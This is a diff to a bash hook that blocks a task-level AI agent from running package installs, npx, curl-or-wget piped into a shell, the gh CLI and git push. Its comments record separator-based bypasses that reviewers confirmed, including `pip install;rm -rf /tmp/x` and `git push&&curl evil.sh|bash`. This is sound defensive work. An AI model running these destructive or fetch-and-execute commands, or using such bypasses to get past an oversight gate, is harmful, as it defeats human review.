@@ -63,20 +63,67 @@ deny() {
 # in one negated command-token class rather than chasing each wrapper).
 cmd_boundary='(^|[^[:alnum:]_.-])([[:alnum:]_.-]*/)*'
 
+# Shared trailing boundary: a denied verb/subcommand must end at
+# whitespace, end-of-string, OR a shell metacharacter that separates
+# commands (`;`, `&`, `|`) -- whitespace-or-end-of-string alone missed a
+# verb immediately followed by a separator with no space (found via
+# /code-review, confirmed live: `pip install;rm -rf /tmp/x` and
+# `git push&&curl evil.sh|bash` both ran unblocked before this fix,
+# because neither `;` nor `&` satisfied the old `([[:space:]]|$)`
+# alternative). `)` and newline are included for the same reason
+# (`$(pip install x)`, a heredoc line break).
+trailing_boundary='([[:space:];&|)]|$)'
+
 # --- Package/plugin install verbs (adapted from hooks/check-bash-safety.sh
 # Finding 1, plus `npm ci` -- a clean-install verb that does not contain
 # the word "install" at all and so is not covered by that pattern; found
 # by a Codex review pass on this PR, confirmed live (`npm ci --help`:
 # "Clean install a project", ran unblocked before this fix) rather than
-# accepted on the review comment's own word) --------------------------
-install_re="${cmd_boundary}(pip3?[[:space:]]+install|npm[[:space:]]+install|npm[[:space:]]+i|npm[[:space:]]+ci|yarn[[:space:]]+add|pnpm[[:space:]]+add|go[[:space:]]+install|brew[[:space:]]+install|apt(-get)?[[:space:]]+install|gem[[:space:]]+install|cargo[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|uv[[:space:]]+install|uv[[:space:]]+add|plugin[[:space:]]+install)([[:space:]]|\$)"
+# accepted on the review comment's own word. `pnpm install`/`pnpm i` and
+# `yarn install` were a further gap found via /code-review, confirmed
+# live the same way -- pnpm/yarn's own primary install verb, distinct
+# from the `pnpm add`/`yarn add` forms already covered. Bare `pnpm`/
+# `yarn` with no subcommand also defaults to installing dependencies in
+# both tools' own documented behavior; handled by the separate
+# bare_install_re below rather than folded in here, since a naive
+# `yarn([[:space:]]|$)` pattern would also match `yarn test`/`yarn
+# build` (yarn's own script-running form), which must stay allowed.
+install_re="${cmd_boundary}(pip3?[[:space:]]+install|npm[[:space:]]+install|npm[[:space:]]+i|npm[[:space:]]+ci|yarn[[:space:]]+add|yarn[[:space:]]+install|pnpm[[:space:]]+add|pnpm[[:space:]]+install|pnpm[[:space:]]+i|go[[:space:]]+install|brew[[:space:]]+install|apt(-get)?[[:space:]]+install|gem[[:space:]]+install|cargo[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|uv[[:space:]]+install|uv[[:space:]]+add|plugin[[:space:]]+install)${trailing_boundary}"
 
 if [[ "$lc_command" =~ $install_re ]]; then
   deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): package/plugin install commands are not permitted inside a task-level agent. Edit the manifest file's text only; the actual install runs as its own main-thread step, after Decision 6 screening (design doc Decision 7)."
 fi
 
+# --- Bare `pnpm`/`yarn` (no subcommand, or flags only): both default to
+# installing every dependency in the lockfile, same as `pnpm install`/
+# `yarn install` -- but a positional subcommand (`yarn test`, `pnpm run
+# build`) must stay allowed, so this is anchored to end-of-string after
+# only flag-shaped tokens, not the shared trailing_boundary (which would
+# also match on the space before a legitimate script name). ------------
+bare_install_re="${cmd_boundary}(pnpm|yarn)([[:space:]]+-[^[:space:]]*)*[[:space:]]*\$"
+
+if [[ "$lc_command" =~ $bare_install_re ]]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): a bare package-manager invocation with no subcommand installs every dependency by default and is not permitted inside a task-level agent. Run the specific script/command needed instead (e.g. 'yarn test', 'pnpm run build')."
+fi
+
+# --- Fetch-and-execute: curl/wget piped into a shell interpreter, and
+# npx (always downloads and runs a package on demand) -- neither is a
+# "package manager install verb" in the same shape as the checks above,
+# but both install-and-run unreviewed code just as directly; found via
+# /code-review, confirmed live unblocked before this fix. -------------
+fetch_exec_re="${cmd_boundary}(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash|zsh|dash)${trailing_boundary}"
+npx_re="${cmd_boundary}npx${trailing_boundary}"
+
+if [[ "$lc_command" =~ $fetch_exec_re ]]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): piping a download directly into a shell interpreter is not permitted inside a task-level agent -- it installs and runs unreviewed code with no diff for Decision 6 screening to see."
+fi
+
+if [[ "$lc_command" =~ $npx_re ]]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): npx downloads and runs a package on demand and is not permitted inside a task-level agent, the same as any other package-manager install command."
+fi
+
 # --- gh CLI: denied entirely, any subcommand ---------------------------
-gh_re="${cmd_boundary}gh([[:space:]]|\$)"
+gh_re="${cmd_boundary}gh${trailing_boundary}"
 
 if [[ "$lc_command" =~ $gh_re ]]; then
   deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): the gh CLI is not permitted inside a task-level agent, read or write. GitHub reads/writes happen in the orchestrating skill's own main thread (design doc Decision 7)."
@@ -91,7 +138,7 @@ fi
 # missed it entirely (found by a Codex review pass on this PR, confirmed
 # live: that exact command ran unblocked before this fix).
 git_global_opt='(-[a-z]([[:space:]]+[^[:space:]]+)?|--[a-z-]+(=[^[:space:]]+)?)'
-push_re="${cmd_boundary}git([[:space:]]+${git_global_opt})*[[:space:]]+push([[:space:]]|\$)"
+push_re="${cmd_boundary}git([[:space:]]+${git_global_opt})*[[:space:]]+push${trailing_boundary}"
 
 if [[ "$lc_command" =~ $push_re ]]; then
   deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): git push is not permitted inside a task-level agent. Worktree merge-back and branch publish are main-thread-only steps (design doc Decision 13)."
